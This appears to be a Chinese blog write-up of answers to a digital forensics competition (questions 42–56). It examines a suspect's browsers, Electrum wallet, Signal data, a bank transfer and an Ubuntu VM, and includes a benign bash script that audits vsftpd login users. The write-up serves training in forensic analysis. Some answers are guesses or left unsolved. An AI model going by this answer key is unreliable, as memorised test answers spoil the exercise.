+<p><img src="http://picture.928330.xyz/typora/image-20250815141230031.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815141230031"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>20220915
+</span></span></code></pre></div><h2 id="42检视林浚照计算机的数据他使用哪种加密货币cryptocurrency-以支付虚拟专用网络软件以大写英文回答该加密货币的全名如-bitcoin">42.检视林浚照计算机的数据，他使用哪种加密货币(Cryptocurrency) 以支付虚拟专用网络软件?以大写英文回答该加密货币的全名，如 BITCOIN)
+</h2><p>电脑里面有四个浏览器，一个个搜索，最终在chrome里面搜索出来了：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815142103333.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815142103333"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Bitcoin
+</span></span></code></pre></div><p>话说这不就是题目示例的吗，心理战这一块</p>
+<h2 id="43林浚熙的加密货币钱包cryptocurrency-wallet-名称是什么不要输入符号以大写英文及阿拉伯数字回答">43.林浚熙的加密货币钱包Cryptocurrency Wallet) 名称是什么?不要输入符号，以大写英文及阿拉伯数字回答)
+</h2><p>火眼里面找不到什么有用的信息，仿真进入电脑桌面看一下：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815142922761.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815142922761"
+	
+	
+></p>
+<p>看到了老熟人vpn，还有一个未知软件electrum，上网搜一下：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815143140498.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815143140498"
+	
+	
+></p>
+<p>这就是电子钱包了，打开看看：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815143332389.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815143332389"
+	
+	
+></p>
+<p>Wallet后的就是钱包名了，后面还有密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>TELLAW_IEH
+</span></span></code></pre></div><p>不过题目说不要输入符号，不知道是什么意思</p>
+<h2 id="44林浚熙计算机里安装了哪个浏览器web-browser">44.林浚熙计算机里安装了哪个浏览器(Web Browser)?
+</h2><p><strong>A.Tor Browser</strong></p>
+<p><strong>B.Opera</strong></p>
+<p><strong>C.Google Chrome</strong></p>
+<p><strong>D.Internet Explorer</strong></p>
+<p><strong>E.Microsoft Edge</strong></p>
+<p>前文找使用的电子货币的时候已经说过了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ACDE
+</span></span></code></pre></div><h2 id="45林浚熙使用浏览器google-chrome曾经浏览最多的是哪-个网站">45.林浚熙使用浏览器Google Chrome曾经浏览最多的是哪 个网站?
+</h2><p><strong>A. <a class="link" href="https://gmail.com"  target="_blank" rel="noopener"
+    >https://gmail.com
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p><strong>B. <a class="link" href="https://mail.google.com/mail"  target="_blank" rel="noopener"
+    >https://mail.google.com/mail
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p><strong>C. <a class="link" href="https://web.whatsapp.com"  target="_blank" rel="noopener"
+    >https://web.whatsapp.com
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p><strong>D. <a class="link" href="https://facebook.com"  target="_blank" rel="noopener"
+    >https://facebook.com
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815164109918.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815164109918"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C
+</span></span></code></pre></div><h2 id="46除了上述网站林浚熙曾使用浏览器google-chrome搜索过什么">46.除了上述网站,林浚熙曾使用浏览器Google Chrome搜索过什么?
+</h2><p><strong>A. javascript教学</strong></p>
+<p><strong>B. php sql教学</strong></p>
+<p><strong>C. tor教学</strong></p>
+<p><strong>D. docker image教学</strong></p>
+<p><strong>E. electrum教学</strong></p>
+<p>一个个搜就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>BCDE
+</span></span></code></pre></div><h2 id="47林浚照的计算机安装了一个通讯软件signal它的用户资讯储存路径是什么">47.林浚照的计算机安装了一个通讯软件Signal，它的用户资讯储存路径是什么?
+</h2><p><strong>A.\Users\HEI\AppData\Roaming\Signal</strong></p>
+<p><strong>B.\Program Files(x86)\Signal</strong></p>
+<p><strong>C.\Users\HEI\Desktop\Signal</strong></p>
+<p><strong>D.\Users\user\Roaming\Signal</strong></p>
+<p>我们在signal里面随便点开一个联系人，就能看见存储路径：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815164601797.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815164601797"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>A
+</span></span></code></pre></div><h2 id="48通讯软件signal采用一个档案存放用户的聊天记录它的档案名是什么不要输入以大写英文及阿拉伯数字回答如cat10jpg需回答cat10jpg">48.通讯软件Signal采用一个档案存放用户的聊天记录，它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG)
+</h2><p>打开私聊消息，右键任意消息记录，点击跳转到源文件：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815164744455.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815164744455"
+	
+	
+></p>
+<p>原来就是上一题看到过的db.sqlite：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815164826105.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815164826105"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DBSQLITE
+</span></span></code></pre></div><h2 id="49承上题对上档案进行分析林发熙的联络人当中有多少人安装了siqnal以阿拉伯数字回答">49.承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了Siqnal?(以阿拉伯数字回答)
+</h2><p>很奇怪，不知道这题想问什么，联络人指的是林俊熙手机的联络人吗，那比对一下：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815170230481.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815170230481"
+	
+	
+></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815170355323.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815170355323"
+	
+	
+></p>
+<p>这四个人的电话（+852）和昵称都对得上，那应该是四个</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>4
+</span></span></code></pre></div><p>另外，上一题的db文件打不开，经检查发现不是sqlite格式，也不是其他常见文件格式，不知道有什么猫腻</p>
+<h2 id="50林浚熙在signal-曾经与某人对话那人的手机号码是什么-需要与区码area-code-一同答以阿拉伯数字">50.林浚熙在“Signal&rsquo; 曾经与某人对话，那人的手机号码是什么? 需要与区码(Area Code) 一同答(以阿拉伯数字)
+</h2><p>上面过程中已经找过，是ROCKY，不多赘述：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>85270711901
+</span></span></code></pre></div><h2 id="51承上题两人在signal-的对话中有些讯息message-包含附件这些讯息的-id包括">51.承上题，两人在Signal&rsquo; 的对话中有些讯息(Message) 包含附件，这些讯息的 &lsquo;ID&rsquo;包括?
+</h2><p><strong>A.5b9650fe-3bb6-4182-9900-f56177003672</strong></p>
+<p><strong>B.46a8762b-78ea-49aa-a6f5-b24975ec189f</strong></p>
+<p><strong>C.9729bf92-ab9c-45f7-8147-66234296aele</strong></p>
+<p><strong>D.47233ffe-1a73-4b3d-b97c-626246ec3129</strong></p>
+<p>完蛋了，db.sqlite文件打不开，做不了，难道是有隐写吗？可是也没发现任何线索</p>
+<h2 id="52承上题林浚熙曾经于2022年10月20日转账transfer-money-予上述对话人士那次转账的参考编号是什么以大写英文及阿拉伯数字回答">52.承上题，林浚熙曾经于2022年10月20日转账（Transfer Money) 予上述对话人士,那次转账的参考编号是什么?(以大写英文及阿拉伯数字回答)
+</h2><p><img src="http://picture.928330.xyz/typora/image-20250815171907283.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815171907283"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>N91088774024
+</span></span></code></pre></div><h1 id="林浚熙的vm53-70">林浚熙的VM(53-70)
+</h1><h2 id="53林浚熙的计算机安装了多少台虚拟机virtual-machine---vm-以阿拉伯数字回答">53.林浚熙的计算机安装了多少台虚拟机Virtual Machine - VM) ?(以阿拉伯数字回答)
+</h2><p><strong>A. 4</strong></p>
+<p><strong>B. 1</strong></p>
+<p><strong>C. 2</strong></p>
+<p><strong>D. 3</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815172044023.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815172044023"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>B
+</span></span></code></pre></div><h2 id="54林浚熙的计算机里的虚拟机vm-存放在什么路径">54.林浚熙的计算机里的虚拟机(VM) 存放在什么路径?
+</h2><p><strong>A.\Users\Public\Documents \Virtual Machines</strong></p>
+<p><strong>B.\Program Files\Virtual Machines</strong></p>
+<p><strong>C.\User\HEN\Roaming\Virtual Machines\</strong></p>
+<p><strong>D.\Users\HEN\Documents\Virtual Machines</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815172157027.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815172157027"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><p>到底是HEI还是HEN？应该是题目搞错了</p>
+<h2 id="55虚拟机-vm-使用什么版本的作业系统operating-system-">55.虚拟机 (VM) 使用什么版本的作业系统(Operating System) ?
+</h2><p><strong>A. CentOs Linux 7.5.1804 (Core)</strong></p>
+<p><strong>B. Ubuntu 22.04.1 LTS</strong></p>
+<p><strong>C. CentOS Linux release 7.6.1810(Core)</strong></p>
+<p><strong>D. Ubuntu 20.04.5 LTS</strong></p>
+<p>把这个.vmdk添加为新检材，查看基本信息：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815172918865.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815172918865"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D
+</span></span></code></pre></div><h2 id="56虚拟机vm-中的文件传输服务器ftp-server-有哪些用户">56.虚拟机(VM) 中的文件传输服务器(FTP Server) 有哪些用户?
+</h2><p><strong>A. nobody</strong></p>
+<p><strong>B. root</strong></p>
+<p><strong>C. admin</strong></p>
+<p><strong>D. man</strong></p>
+<p><strong>E. ftpuser</strong></p>
+<p>从这一步开始，只靠火眼是不行的了，我们必须想办法登录嫌疑人使用的ubuntu虚拟机</p>
+<p>首先我的想法是直接从火眼检材里面导出储存有虚拟机的文件夹，可是导出的却无法使用，总是提示&quot;找不到ubuntu 64-bit.vmdk&quot;，即使修改了.vmx文件，去掉路径空格也没有用，而且导出文件的好几个.vmdk似乎混在一起了，分卷大小很奇怪</p>
+<p>在之后，我想直接在仿真了嫌疑人windows的虚拟机里使用这个虚拟机，结果可能是因为我的电脑没有关闭hyper-v和vbs，让虚拟机不能使用虚拟化功能，而手动关闭需要做的操作太麻烦也太未知，遂放弃</p>
+<p>最后成功的方案：</p>
+<p>安装好vmvare tools之后，按照路径把windows虚拟机里面存放ubuntu的文件夹复制到本机电脑，因为不知道密码所以把.vmdk交给火眼仿真，让火眼重置并生成新的虚拟机，最后登录再使用ssh链接（方便操作）即可</p>
+<p>回到题目，判断ftp使用者的第一步是知道这台服务器上安装了哪一种ftp，使用下面命令查看：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ps aux | grep ftp
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250815200408543.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815200408543"
+	
+	
+></p>
+<p>这里可以看到是vsftp</p>
+<p>具体判断方式需要审查vsftpd的黑白名单，结合uid和shell的允许与否，整理成下面的shell脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#7f848e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">CONFIG</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;/etc/vsftpd.conf&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">FTPUSERS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;/etc/vsftpd.ftpusers&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">USER_LIST_FILE</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;/etc/vsftpd.user_list&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> ! systemctl is-active --quiet vsftpd; <span style="color:#c678dd">then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;vsftpd 未运行&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">exit</span> <span style="color:#d19a66">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span> ! -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$CONFIG</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">{</span> <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;配置文件不存在&#34;</span>; <span style="color:#e5c07b">exit</span> 1; <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">LOCAL_ENABLE</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>grep -v <span style="color:#98c379">&#39;^#&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$CONFIG</span><span style="color:#98c379">&#34;</span> | grep -E <span style="color:#98c379">&#39;local_enable=.*YES&#39;</span> &gt;/dev/null <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e5c07b">echo</span> YES <span style="color:#56b6c2">||</span> <span style="color:#e5c07b">echo</span> NO<span style="color:#c678dd">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ANONYMOUS_ENABLE</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>grep -v <span style="color:#98c379">&#39;^#&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$CONFIG</span><span style="color:#98c379">&#34;</span> | grep -E <span style="color:#98c379">&#39;anonymous_enable=.*YES&#39;</span> &gt;/dev/null <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e5c07b">echo</span> YES <span style="color:#56b6c2">||</span> <span style="color:#e5c07b">echo</span> NO<span style="color:#c678dd">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">USERLIST_ENABLE</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>grep -v <span style="color:#98c379">&#39;^#&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$CONFIG</span><span style="color:#98c379">&#34;</span> | grep -E <span style="color:#98c379">&#39;userlist_enable=.*NO&#39;</span> &gt;/dev/null <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e5c07b">echo</span> NO <span style="color:#56b6c2">||</span> <span style="color:#e5c07b">echo</span> YES<span style="color:#c678dd">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">USERLIST_DENY</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>grep -v <span style="color:#98c379">&#39;^#&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$CONFIG</span><span style="color:#98c379">&#34;</span> | grep -E <span style="color:#98c379">&#39;userlist_deny=.*NO&#39;</span> &gt;/dev/null <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e5c07b">echo</span> NO <span style="color:#56b6c2">||</span> <span style="color:#e5c07b">echo</span> YES<span style="color:#c678dd">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">BLACKLIST</span><span style="color:#56b6c2">=()</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$FTPUSERS</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#c678dd">while</span> <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span> <span style="color:#e5c07b">read</span> -r line; <span style="color:#c678dd">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">[[</span> -z <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$line</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">||</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$line</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">=</span>~ ^# <span style="color:#56b6c2">]]</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">BLACKLIST</span><span style="color:#56b6c2">+=(</span><span style="color:#98c379">&#34;</span><span style="color:#e06c75">$line</span><span style="color:#98c379">&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span> &lt; <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$FTPUSERS</span><span style="color:#98c379">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">USER_LIST</span><span style="color:#56b6c2">=()</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$USER_LIST_FILE</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#c678dd">while</span> <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span> <span style="color:#e5c07b">read</span> -r line; <span style="color:#c678dd">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">[[</span> -z <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$line</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">||</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$line</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">=</span>~ ^# <span style="color:#56b6c2">]]</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">USER_LIST</span><span style="color:#56b6c2">+=(</span><span style="color:#98c379">&#34;</span><span style="color:#e06c75">$line</span><span style="color:#98c379">&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span> &lt; <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$USER_LIST_FILE</span><span style="color:#98c379">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">USERS</span><span style="color:#56b6c2">=()</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">while</span> <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span>: <span style="color:#e5c07b">read</span> -r username _ uid _ _ _ shell; <span style="color:#c678dd">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$uid</span><span style="color:#98c379">&#34;</span> -ge <span style="color:#d19a66">1000</span> <span style="color:#56b6c2">]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">[[</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$shell</span><span style="color:#98c379">&#34;</span> !<span style="color:#56b6c2">=</span> /usr/sbin/nologin <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$shell</span><span style="color:#98c379">&#34;</span> !<span style="color:#56b6c2">=</span> /bin/false <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">USERS</span><span style="color:#56b6c2">+=(</span><span style="color:#98c379">&#34;</span><span style="color:#e06c75">$username</span><span style="color:#98c379">&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span> &lt; /etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ALLOWED_USERS</span><span style="color:#56b6c2">=()</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">[</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$LOCAL_ENABLE</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;YES&#34;</span> <span style="color:#56b6c2">]</span>; <span style="color:#c678dd">then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">for</span> u in <span style="color:#98c379">&#34;</span><span style="color:#98c379">${</span><span style="color:#e06c75">USERS</span>[@]<span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>; <span style="color:#c678dd">do</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">[[</span> <span style="color:#98c379">&#34; </span><span style="color:#98c379">${</span><span style="color:#e06c75">BLACKLIST</span>[*]<span style="color:#98c379">}</span><span style="color:#98c379"> &#34;</span> <span style="color:#56b6c2">==</span> *<span style="color:#98c379">&#34; </span><span style="color:#e06c75">$u</span><span style="color:#98c379"> &#34;</span>* <span style="color:#56b6c2">]]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$USERLIST_ENABLE</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;YES&#34;</span> <span style="color:#56b6c2">]</span>; <span style="color:#c678dd">then</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$USERLIST_DENY</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;YES&#34;</span> <span style="color:#56b6c2">]</span>; <span style="color:#c678dd">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">[[</span> <span style="color:#98c379">&#34; </span><span style="color:#98c379">${</span><span style="color:#e06c75">USER_LIST</span>[*]<span style="color:#98c379">}</span><span style="color:#98c379"> &#34;</span> <span style="color:#56b6c2">==</span> *<span style="color:#98c379">&#34; </span><span style="color:#e06c75">$u</span><span style="color:#98c379"> &#34;</span>* <span style="color:#56b6c2">]]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">[[</span> <span style="color:#98c379">&#34; </span><span style="color:#98c379">${</span><span style="color:#e06c75">USER_LIST</span>[*]<span style="color:#98c379">}</span><span style="color:#98c379"> &#34;</span> !<span style="color:#56b6c2">=</span> *<span style="color:#98c379">&#34; </span><span style="color:#e06c75">$u</span><span style="color:#98c379"> &#34;</span>* <span style="color:#56b6c2">]]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">fi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ALLOWED_USERS</span><span style="color:#56b6c2">+=(</span><span style="color:#98c379">&#34;</span><span style="color:#e06c75">$u</span><span style="color:#98c379">&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;实际可登录 FTP 用户:&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">[</span> <span style="color:#98c379">${#</span><span style="color:#e06c75">ALLOWED_USERS</span>[@]<span style="color:#98c379">}</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]</span>; <span style="color:#c678dd">then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;无用户可登录&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e5c07b">printf</span> <span style="color:#98c379">&#34;%s\n&#34;</span> <span style="color:#98c379">&#34;</span><span style="color:#98c379">${</span><span style="color:#e06c75">ALLOWED_USERS</span>[@]<span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$ANONYMOUS_ENABLE</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;YES&#34;</span> <span style="color:#56b6c2">]</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;匿名用户可登录&#34;</span>
